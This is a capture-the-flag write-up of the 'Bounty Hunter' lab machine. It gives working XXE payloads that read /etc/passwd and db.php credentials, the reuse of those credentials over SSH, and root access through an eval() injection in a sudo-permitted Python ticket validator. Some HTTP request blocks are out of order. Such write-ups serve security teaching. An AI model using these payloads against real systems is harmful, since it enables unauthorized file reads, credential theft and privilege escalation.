# Bounty Hunter Writeup

Bounty Hunter was a cool linux box that explored XXE to get a file read.

# Enumeration

Lets start with a nmap scan to see what we have open.

```bash
nmap -p- --min-rate 10000 10.10.11.100 -oN init
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 09:30 EDT
Nmap scan report for 10.10.11.100
Host is up (0.021s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```
We have two ports open, 22 for ssh and 80 for http. Lets do an aggressive scan on those ports.

```bash
nmap -sCV -p22,80 10.10.11.100 -oN agg
```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 09:31 EDT
Nmap scan report for bountyh (10.10.11.100)
Host is up (0.0100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.60 seconds
```
Nothing too interesting here. Lets take a look at the website and see what we can find.

# Web Enumeration

Navigating to the website we see what looks to be a simple webpage with a link to a bug bounty report subdirectory

```http
http://bountyh/log_submit.php
```

When we try to submit a bug report we are turned text below the form that says "If DB were ready, would have added:" and then shows our inputs. There could be a couple different things going on here. Lets send the POST to burp and see what we can find.

```http
POST /tracker_diRbPr00f314.php HTTP/1.1

Host: bountyh

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 209

Origin: http://bountyh

Connection: keep-alive

Referer: http://bountyh/log_submit.php

Priority: u=0



data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT53ZTwvdGl0bGU%2BCgkJPGN3ZT53ZTwvY3dlPgoJCTxjdnNzPndlPC9jdnNzPgoJCTxyZXdhcmQ%2BPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```

It appears that the we are sending `POST` request to `/tracker_diRbPr00f314.php` with some XML data. The XML data is base64 encoded. Also, we notice %2B is used which means it is first URL encoded and then base64 encoded. Lets edit the snippet so we are able to base64 decode it.

```
RAW = PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT53ZTwvdGl0bGU%2BCgkJPGN3ZT53ZTwvY3dlPgoJCTxjdnNzPndlPC9jdnNzPgoJCTxyZXdhcmQ%2Bd2U8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```
Lets just manually URL decode it since there isn't many URL encoded characters.

```
POST-EDIT = PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT53ZTwvdGl0bGU+CgkJPGN3ZT53ZTwvY3dlPgoJCTxjdnNzPndlPC9jdnNzPgoJCTxyZXdhcmQ+d2U8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=
```
Now we can base64 decode it.

```bash
echo 'PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT53ZTwvdGl0bGU+CgkJPGN3ZT53ZTwvY3dlPgoJCTxjdnNzPndlPC9jdnNzPgoJCTxyZXdhcmQ+d2U8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4=' | base64 -d
```
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
                <bugreport>
                <title>we</title>
                <cwe>we</cwe>
                <cvss>we</cvss>
                <reward>we</reward>
                </bugreport>                                                                                        
```
After reviewing the XML we can confirm that it is a bug report submission. Lets see if we can submit a bug report with an XXE payload. We will craft the following payload to read the `/etc/passwd` file.

```bash
nano f.xml
```
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>test</title>
 <cwe>test</cwe>
 <cvss>test</cvss>
 <reward>&file;</reward>
</bugreport>
```
Next we have to Base64 encode the XML file and URL encode it so we can submit it in the POST request. When we are Base64 encoding the XML file, we need to make sure that we use the `-w 0` flag so that it does not wrap the output. This is important for the URL encoding step.

```bash
echo '<?xml version="1.0" encoding="ISO-8859-1"?><bugreport><title>we</title><cwe>we</cwe><cvss>we</cvss><reward>we</reward><!DOCTYPE bugreport [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xxe>&xxe;</xxe></bugreport>' | base64 -w 0
```
Now, lets URL encode it. Use can use ChatGPT, manually do it, or use urlencoder.org.

Now, we can finally submit our craft XML payload!

```HTTP
POST /tracker_diRbPr00f314.php HTTP/1.1

Host: bountyh

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 211

Origin: http://bountyh

Connection: keep-alive

Referer: http://bountyh/log_submit.php

Priority: u=0



data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPjxidWdyZXBvcnQ%2BPHRpdGxlPndlPC90aXRsZT48Y3dlPndlPC9jd2U%2BPGN2c3M%2Bd2U8L2N2c3M%2BPHJld2FyZD53ZTwvcmV3YXJkPjwhRE9DVFlQRSBidWdyZXBvcnQgWzwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2BXT48eHhlPiZ4eGU7PC94eGU%2BPC9idWdyZXBvcnQ%2BCg%3D%3D
```
Interestingly, our exploit was not successful. We received the following response. We got a `HTTP OK` response, but it looks like our XML might've not been encoded correctly. Lets take another look at it and see if we can find any issues.

```XML
PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPjxidWdyZXBvcnQ%2BPHRpdGxlPndlPC90aXRsZT48Y3dlPndlPC9jd2U%2BPGN2c3M%2Bd2U8L2N2c3M%2BPHJld2FyZD53ZTwvcmV3YXJkPjwhRE9DVFlQRSBidWdyZXBvcnQgWzwhRU5USVRZIHh4ZSBTWVNURU0gImZpbGU6Ly8vZXRjL3Bhc3N3ZCI%2BXT48eHhlPiZ4eGU7PC94eGU%2BPC9idWdyZXBvcnQ%2BCg%3D%3D
```
Hmm, it looks like we might've base64 encoded the xml incorrectly. Instead of using `echo` to base64 encode the XML, we should've used `cat` to read the file directly, and pipe the `base64` command to it. Lets try that again.

```bash
cat f.xml | base64 -w 0
```
Then URL encode the output again.

Lets try submitting the payload again with the new base64 encoded XML with burp.

```HTTP
POST /tracker_diRbPr00f314.php HTTP/1.1

Host: bountyh

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

X-Requested-With: XMLHttpRequest

Content-Length: 297

Origin: http://bountyh

Connection: keep-alive

Referer: http://bountyh/log_submit.php

Priority: u=0



data=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI%2FPgo8IURPQ1RZUEUgZGF0YSBbCjwhRU5USVRZIGZpbGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPgo8YnVncmVwb3J0Pgo8dGl0bGU%2BdGVzdDwvdGl0bGU%2BCiA8Y3dlPnRlc3Q8L2N3ZT4KIDxjdnNzPnRlc3Q8L2N2c3M%2BCiA8cmV3YXJkPiZmaWxlOzwvcmV3YXJkPgo8L2J1Z3JlcG9ydD4K
```
After submitting the payload, we received the following response:

```HTTP
HTTP/1.1 200 OK

Date: Wed, 11 Jun 2025 15:14:17 GMT

Server: Apache/2.4.41 (Ubuntu)

Vary: Accept-Encoding

Content-Length: 2102

Keep-Alive: timeout=5, max=100

Connection: Keep-Alive

Content-Type: text/html; charset=UTF-8



If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>test</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</td>
  </tr>
</table>
```
Nice! We can see that we were able to read the `/etc/passwd` file. We can also see that the XML was parsed correctly and the data was added to the response.


# Foothold

Since  we know this is an Apache server, we can try and read the `db.php` file to see if we can find any credentials. We will modify our XML payload to read the `db.php` file located in the `/var/www/html/` directory.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-
encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>test</title>
 <cwe>test</cwe>
 <cvss>test</cvss>
 <reward>&file;</reward>
</bugreport>
```
After encoding and submitting the payload we will receive a base64 encoded response. We can decode it using the following XML payload to read the `db.php` file.

```HTTP
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.198.241
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 375
```
Again we need to decode the base64 data we received.
It seems that we got some credentials and now it is possible to check if we can login. We are spraying this
password to system users we got from the /etc/passwd file and indeed we manage to get a successful
login with the user development .

```http
Origin: http://10.129.198.241
DNT: 1
Connection: close
Referer: http://10.129.198.241/log_submit.php
Sec-GPC: 1
data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWw
o8IUVOVElUWSBmaWxlIFNZU1RFTSAicGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc
291cmNlPS92YXIvd3d3L2h0bWwvZGIucGhwIj4gXT4KPGJ1Z3JlcG9ydD4KPHRpdGxlPnRlc3Q8L3RpdGxlPgog
IDxjd2U%2bdGVzdDwvY3dlPgogIDxjdnNzPnRlc3Q8L2N2c3M%2bCiAgPHJld2FyZD4mZmlsZTs8L3Jld2FyZD4
KPC9idWdyZXBvcnQ%2bCg%3d%3d
```

```
This is our response
```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "<REDACTED>";
$testuser = "test";
?>
```
Nice! Lets see SSH in with these creds and see what we can find.

At first, it seems we can't login as admin, but we can login as `development` with the password `<REDACTED>`.


# Privesc


The user flag can be found in the home directory of the `development` user. We can also find a .txt file named `contract.txt`, lets read it!
```bash
cat contract.txt
```
```txt 
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```
It seems like we need to look into the internal tool that Skytrain Inc sent over. We can see that there are some tickets that have been failing validation. Lets take a look around and see if we can find that tool.

We find the tool in the `/opt/skytrain_inc` directory. It is named `ticketValidator.py`. Lets take a look at it.

```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```
We definitely see some interesting things here. The first thing that stands out is the `eval` function being used to evaluate the ticket code. This is a potential security risk as it can execute arbitrary code.

We should also take a look and see if we can run the script as root.

```bash
sudo -l
```
```txt
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
We can see that we can run the `ticketValidator.py` script as root without a password. This is a potential privilege escalation vector. We can try to exploit the `eval` function in the script to execute arbitrary code as root.

To do this lets go into the `/opt/skytrain_inc/invalid_tickets` directory to see the format of the tickets. We can see that the tickets are in markdown format and have a specific structure. We can create a new ticket with a malicious payload that will be executed when the script is run.

```MD
# Skytrain Inc
## Ticket to New Haven
__Ticket Code:__
**31+410+86**
##Issued: 2021/04/06
#End Ticket
```
We will create the following malicious ticket in `/tmp`.

```MD
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**179+ 25 == 204 and __import__('os').system('/bin/bash') == True
```
Now, lets see if we can run the script as root with our malicious ticket, and get a root shell.

```bash
development@bountyhunter:/tmp$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

Please enter the path to the ticket file.
/tmp/f.md
Destination: Mars
root@bountyhunter:/tmp# whoami
root

```
Yup! We were able to get a root shell by exploiting the `eval` function in the `ticketValidator.py` script. We can now read the root flag.

First writeup here. Hopefully more to come! I used the official HTB writeup as a reference for this box.